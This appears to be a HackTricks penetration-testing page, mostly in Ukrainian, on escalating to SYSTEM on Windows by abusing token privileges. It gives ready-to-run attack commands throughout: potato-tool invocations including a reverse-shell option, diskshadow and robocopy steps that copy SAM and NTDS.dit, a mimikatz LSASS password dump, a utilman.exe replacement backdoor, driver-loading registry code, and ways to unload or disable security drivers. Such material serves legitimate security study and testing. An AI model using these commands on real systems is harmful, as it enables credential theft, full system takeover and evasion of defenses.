# Abusing Tokens

{{#include ../../banners/hacktricks-training.md}}

## Tokens

Якщо ви **не знаєте, що таке Windows Access Tokens**, прочитайте цю сторінку перед тим, як продовжити:


{{#ref}}
access-tokens.md
{{#endref}}

**Можливо, ви зможете підвищити привілеї, зловживаючи токенами, які вже маєте**

### SeImpersonatePrivilege

Це privilege, яке є у будь-якого process і дозволяє impersonation (але не creation) будь-якого token, за умови що до нього можна отримати handle. Privileged token можна отримати з Windows service (DCOM), змусивши його виконати NTLM authentication проти exploit, після чого стає можливо виконати process з привілеями SYSTEM. Цю vulnerability можна експлуатувати за допомогою різних tools, таких як [juicy-potato](https://github.com/ohpe/juicy-potato), [RogueWinRM](https://github.com/antonioCoco/RogueWinRM) (which requires winrm to be disabled), [SweetPotato](https://github.com/CCob/SweetPotato), and [PrintSpoofer](https://github.com/itm4n/PrintSpoofer).

Modern operator notes:

- **JuicyPotato is legacy**: on Windows 10 1809+/Server 2019+, prefer **GodPotato**, **SigmaPotato**, **PrintNotifyPotato**, **RoguePotato**, **SharpEfsPotato/EfsPotato**, or **PrintSpoofer** depending on which RPC/COM surface is still reachable.
- If you compromised a service running as **`LOCAL SERVICE`** or **`NETWORK SERVICE`** and `whoami /priv` shows a **filtered token** without `SeImpersonatePrivilege`/`SeAssignPrimaryTokenPrivilege`, recover the account's **default privilege set** first (for example with **FullPowers**) and retry the potato family afterwards.
- Some newer forks are more operator-friendly than the original tools. For example, **SigmaPotato** adds reflection/in-memory execution and modern Windows compatibility, while **PrintNotifyPotato** abuses the PrintNotify COM service and is often useful when the classic Spooler path is disabled.
```cmd
FullPowers.exe -c "cmd /c whoami /priv" -z
GodPotato.exe -cmd "cmd /c whoami"
SigmaPotato.exe --revshell <ip> <port>
PrintNotifyPotato.exe whoami
```
{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}


{{#ref}}
juicypotato.md
{{#endref}}

### SeAssignPrimaryPrivilege

Він дуже схожий на **SeImpersonatePrivilege**, він використовуватиме **той самий метод** для отримання privileged token.\
Потім цей privilege дозволяє **призначити primary token** новому/призупиненому процесу. Із privileged impersonation token ви можете деривувати primary token (DuplicateTokenEx).\
За допомогою token ви можете створити **новий процес** через 'CreateProcessAsUser' або створити процес у стані suspended і **встановити token** (загалом ви не можете змінити primary token процесу, що вже працює).

### SeTcbPrivilege

Якщо цей token увімкнено, ви можете використовувати **KERB_S4U_LOGON**, щоб отримати **impersonation token** для будь-якого іншого користувача без знання credentials, **додати довільну group** (admins) до token, встановити **integrity level** token на "**medium**" і призначити цей token **поточному thread** (SetThreadToken).

### SeBackupPrivilege

Цей privilege змушує систему **надавати весь read access** до будь-якого файлу (обмежено операціями читання). Його використовують для **читання password hashes локальних облікових записів Administrator** з registry, після чого можна використовувати tools на кшталт "**psexec**" або "**wmiexec**" з hash (Pass-the-Hash technique). Однак цей technique не працює за двох умов: коли Local Administrator account вимкнено, або коли діє policy, що прибирає administrative rights у Local Administrators, які підключаються remotely.\
На практиці найнадійніший вбудований workflow зазвичай — **VSS + `robocopy /b`**: створіть/відкрийте shadow copy, потім скопіюйте `SAM`/`SYSTEM` або `NTDS.dit` у **backup mode**, що обходить file ACLs.
```cmd
:: shadow.txt
set context persistent nowriters
add volume c: alias tk
create
expose %tk% z:

:: then copy sensitive files from the snapshot
diskshadow /s shadow.txt
robocopy /b z:\Windows\System32\Config C:\temp SAM SYSTEM SECURITY
robocopy /b z:\Windows\NTDS C:\temp ntds.dit
```
Ви можете **abuse this privilege** за допомогою:

- [https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1](https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1)
- [https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug](https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug)
- за порадами **IppSec** у [https://www.youtube.com/watch?v=IfCysW0Od8w\&t=2610\&ab_channel=IppSec](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610&ab_channel=IppSec)
- Або як пояснено в розділі **escalating privileges with Backup Operators** у:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### SeRestorePrivilege

Ця privilege надає право **write access** до будь-якого системного файлу, незалежно від Access Control List (ACL) файлу. Вона відкриває численні можливості для escalation, включно з можливістю **modify services**, виконувати DLL Hijacking і встановлювати **debuggers** через Image File Execution Options серед інших технік.

### SeCreateTokenPrivilege

SeCreateTokenPrivilege — це потужний privilege, особливо корисний, коли користувач має можливість impersonate tokens, але також і за відсутності SeImpersonatePrivilege. Ця можливість базується на здатності impersonate token, який представляє того самого користувача і чий integrity level не перевищує integrity level поточного процесу.

**Key Points:**

- **Impersonation without SeImpersonatePrivilege:** Можливо використати SeCreateTokenPrivilege для EoP, impersonating tokens за певних умов.
- **Conditions for Token Impersonation:** Успішний impersonation вимагає, щоб target token належав тому самому користувачу і мав integrity level, що менший або дорівнює integrity level процесу, який намагається виконати impersonation.
- **Creation and Modification of Impersonation Tokens:** Користувачі можуть створити impersonation token і посилити його, додавши SID (Security Identifier) привілейованої групи.

### SeLoadDriverPrivilege

Цей privilege дозволяє **load and unload device drivers** шляхом створення запису в registry зі специфічними значеннями `ImagePath` і `Type`. Оскільки прямий write access до `HKLM` (HKEY_LOCAL_MACHINE) обмежений, натомість потрібно використовувати `HKCU` (HKEY_CURRENT_USER). Однак, щоб `HKCU` був розпізнаний kernel для налаштування driver, потрібно дотримуватися спеціального шляху.

Сучасне offensive use зазвичай є **BYOVD** (bring your own vulnerable driver): завантажте **signed but vulnerable** kernel driver і потім використайте його IOCTLs, щоб вимкнути protections або перейти до kernel code execution. Майте на увазі, що в нещодавніх збірках Windows 11/Server **Microsoft vulnerable driver blocklist** і/або **HVCI/Memory Integrity** часто ламають старі public chains, тож класичні приклади на кшталт `szkg64.sys` більше не є універсально надійними.

Цей шлях: `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName`, де `<RID>` — це Relative Identifier поточного користувача. Усередині `HKCU` весь цей шлях потрібно створити, і треба задати два значення:

- `ImagePath` — шлях до binary, який буде виконано
- `Type` зі значенням `SERVICE_KERNEL_DRIVER` (`0x00000001`).

**Steps to Follow:**

1. Отримайте доступ до `HKCU` замість `HKLM` через обмежений write access.
2. Створіть шлях `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName` всередині `HKCU`, де `<RID>` представляє Relative Identifier поточного користувача.
3. Встановіть `ImagePath` як шлях виконання binary.
4. Призначте `Type` як `SERVICE_KERNEL_DRIVER` (`0x00000001`).
```python
# Example Python code to set the registry values
import winreg as reg

# Define the path and values
path = r'Software\YourPath\System\CurrentControlSet\Services\DriverName' # Adjust 'YourPath' as needed
key = reg.OpenKey(reg.HKEY_CURRENT_USER, path, 0, reg.KEY_WRITE)
reg.SetValueEx(key, "ImagePath", 0, reg.REG_SZ, "path_to_binary")
reg.SetValueEx(key, "Type", 0, reg.REG_DWORD, 0x00000001)
reg.CloseKey(key)
```
Більше способів зловживати цим privilege у [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege)

### SeTakeOwnershipPrivilege

Це схоже на **SeRestorePrivilege**. Його основна функція дозволяє процесу **приймати ownership об'єкта**, обходячи вимогу явного discretionary access через надання WRITE_OWNER access rights. Процес полягає спочатку в отриманні ownership потрібного registry key для запису, а потім у зміні DACL, щоб увімкнути операції запису.
```bash
takeown /f 'C:\some\file.txt' #Now the file is owned by you
icacls 'C:\some\file.txt' /grant <your_username>:F #Now you have full access
# Use this with files that might contain credentials such as
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software
%WINDIR%\repair\security
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
c:\inetpub\wwwwroot\web.config
```
### SeDebugPrivilege

Цей привілей дозволяє **debug other processes**, зокрема читати та записувати в пам'ять. За допомогою цього привілею можна застосовувати різні стратегії memory injection, здатні обходити більшість antivirus та host intrusion prevention рішень.

На сучасному Windows пам’ятайте, що `SeDebugPrivilege` зазвичай достатньо, щоб відкрити **non-protected SYSTEM processes** і дублювати їхні tokens, але це **не** гарантує, що ви зможете зачепити **LSASS**. Якщо **RunAsPPL / LSA Protection** увімкнено, non-protected processes не можуть читати або інжектити в LSASS навіть якщо `SeDebugPrivilege` присутній. У такому разі вкрадіть token з іншого non-PPL SYSTEM process або використайте ланцюжок із PPL bypass/BYOVD замість припущення, що `procdump` спрацює. Для повного прикладу копіювання token з використанням `SeDebugPrivilege` + `SeImpersonatePrivilege` дивіться [this page](sedebug-+-seimpersonate-copy-token.md).

#### Dump memory

Ви можете використати [ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) з [SysInternals Suite](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite), щоб **capture the memory of a process**. Зокрема, це може застосовуватися до процесу **Local Security Authority Subsystem Service (**[**LSASS**](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service)**)**, який відповідає за збереження облікових даних користувача після успішного входу в систему.

Потім ви можете завантажити цей дамп у mimikatz, щоб отримати паролі:
```
mimikatz.exe
mimikatz # log
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```
#### RCE

Якщо ви хочете отримати shell `NT SYSTEM`, ви можете використати:

- [**SeDebugPrivilege-Exploit (C++)**](https://github.com/bruno-1337/SeDebugPrivilege-Exploit)
- [**SeDebugPrivilegePoC (C#)**](https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC)
- [**psgetsys.ps1 (Powershell Script)**](https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1)
```bash
# Get the PID of a process running as NT SYSTEM
import-module psgetsys.ps1; [MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>)
```
### SeManageVolumePrivilege

Це право (Perform volume maintenance tasks) дозволяє відкривати raw volume device handles (наприклад, \\.\C:) для прямого disk I/O, що обходить NTFS ACLs. З його допомогою можна копіювати байти будь-якого файла на volume, читаючи базові blocks, що дає змогу arbitrary file read чутливих даних (наприклад, machine private keys у %ProgramData%\Microsoft\Crypto\, registry hives, SAM/NTDS через VSS). Це особливо критично на CA servers, де exfiltrating CA private key дає змогу створити Golden Certificate, щоб impersonate будь-який principal.

Див. детальні techniques і mitigations:

{{#ref}}
semanagevolume-perform-volume-maintenance-tasks.md
{{endref}}

## Check privileges
```
whoami /priv
```
**Токени, що відображаються як Disabled**, зазвичай можна увімкнути, тож часто можна використовувати як _Enabled_, так і _Disabled_ привілеї.

### Enable All the tokens

Якщо у вас є disabled privileges, ви можете використати скрипт [**EnableAllTokenPrivs.ps1**](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1), щоб увімкнути всі токени:
```bash
.\EnableAllTokenPrivs.ps1
whoami /priv
```
Або **script**, вбудований у цей [**post**](https://www.leeholmes.com/adjusting-token-privileges-in-powershell/).

## Table

Повна cheatsheet з token privileges: [https://github.com/gtworek/Priv2Admin](https://github.com/gtworek/Priv2Admin), нижче наведено лише прямі способи використати privilege, щоб отримати admin session або прочитати чутливі файли.

| Privilege                  | Impact      | Tool                    | Execution path                                                                                                                                                                                                                                                                                                                                     | Remarks                                                                                                                                                                                                                                                                                                                        |
| ------------------------- | ----------- | ----------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **`SeAssignPrimaryToken`** | _**Admin**_ | 3rd party tool          | _"It would allow a user to impersonate tokens and privesc to nt system using tools such as potato.exe, rottenpotato.exe and juicypotato.exe"_                                                                                                                                                                                                      | Дякую [Aurélien Chalot](https://twitter.com/Defte_) за оновлення. Я спробую незабаром перефразувати це в більш recipe-like вигляд.                                                                                                                                                                                         |
| **`SeBackup`**             | **Threat**  | _**Built-in commands**_ | Read sensitive files with `robocopy /b` or dedicated SeBackup-aware copy helpers.                                                                                                                                                                                                                                                                 | <p>- Чудово підходить для `SAM`/`SYSTEM`, `SECURITY`, `NTDS.dit`, а іноді й для `%WINDIR%\MEMORY.DMP`.<br><br>- `robocopy` зручний, але спеціалізовані SeBackup cmdlets/APIs часто гнучкіші для locked/open files.</p>                                                                                                   |
| **`SeCreateToken`**        | _**Admin**_ | 3rd party tool          | Create arbitrary token including local admin rights with `NtCreateToken`.                                                                                                                                                                                                                                                                          |                                                                                                                                                                                                                                                                                                                                |
| **`SeDebug`**              | _**Admin**_ | **PowerShell**          | Duplicate a **non-PPL** SYSTEM token or dump memory from a non-protected process.                                                                                                                                                                                                                                                                 | <p>LSASS dumping commonly blocked if RunAsPPL/LSA Protection is enabled.</p><p>Script to be found at [FuzzySecurity](https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Conjure-LSASS.ps1)</p>                                                                                                               |
| **`SeImpersonate`**        | _**Admin**_ | 3rd party tool          | Use the **Potato family** / named-pipe impersonation to spawn SYSTEM (`PrintSpoofer`, `RoguePotato`, `GodPotato`, `SigmaPotato`, `PrintNotifyPotato`, etc.).                                                                                                                                                                                    | <p>Most practical from service accounts such as IIS APPPOOL, MSSQL, scheduled tasks, or any context that already owns `SeImpersonatePrivilege`.</p>                                                                                                                                                                            |
| **`SeLoadDriver`**         | _**Admin**_ | 3rd party tool          | <p>1. Load a signed-but-vulnerable kernel driver (BYOVD)<br>2. Use the driver's IOCTLs to get kernel R/W, disable security tooling, or elevate to SYSTEM<br><br>Alternatively, the privilege may be used to unload security-related drivers with <code>fltMC</code> builtin command, i.e. <code>fltMC sysmondrv</code></p>                     | <p>Older public drivers such as <code>szkg64.sys</code> are increasingly blocked on modern Windows by the vulnerable-driver blocklist / HVCI.</p>                                                                                                                                                                               |
| **`SeRestore`**            | _**Admin**_ | **PowerShell**          | <p>1. Launch PowerShell/ISE with the SeRestore privilege present.<br>2. Enable the privilege with <a href="https://github.com/gtworek/PSBits/blob/master/Misc/EnableSeRestorePrivilege.ps1">Enable-SeRestorePrivilege</a>).<br>3. Rename utilman.exe to utilman.old<br>4. Rename cmd.exe to utilman.exe<br>5. Lock the console and press Win+U</p> | <p>Attack may be detected by some AV software.</p><p>Alternative method relies on replacing service binaries stored in "Program Files" using the same privilege</p>                                                                                                                                                            |
| **`SeTakeOwnership`**      | _**Admin**_ | _**Built-in commands**_ | <p>1. <code>takeown.exe /f "%windir%\system32"</code><br>2. <code>icacls.exe "%windir%\system32" /grant "%username%":F</code><br>3. Rename cmd.exe to utilman.exe<br>4. Lock the console and press Win+U</p>                                                                                                                                       | <p>Attack may be detected by some AV software.</p><p>Alternative method relies on replacing service binaries stored in "Program Files" using the same privilege.</p>                                                                                                                                                           |
| **`SeTcb`**                | _**Admin**_ | 3rd party tool          | <p>Manipulate tokens to have local admin rights included. May require SeImpersonate.</p><p>To be verified.</p>                                                                                                                                                                                                                                     |                                                                                                                                                                                                                                                                                                                                |

## References

- Take a look to this table defining Windows tokens: [https://github.com/gtworek/Priv2Admin](https://github.com/gtworek/Priv2Admin)
- Take a look to [**this paper**](https://github.com/hatRiot/token-priv/blob/master/abusing_token_eop_1.0.txt) about privesc with tokens.
- itm4n – Give Me Back My Privileges! Please? (restricted service tokens / FullPowers): https://itm4n.github.io/localservice-privileges/
- Microsoft – Robocopy (`/b` backup mode bypasses file/folder ACL checks): https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy
- Microsoft – Perform volume maintenance tasks (SeManageVolumePrivilege): https://learn.microsoft.com/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/perform-volume-maintenance-tasks
- 0xdf – HTB: Certificate (SeManageVolumePrivilege → CA key exfil → Golden Certificate): https://0xdf.gitlab.io/2025/10/04/htb-certificate.html

{{#include ../../banners/hacktricks-training.md}}
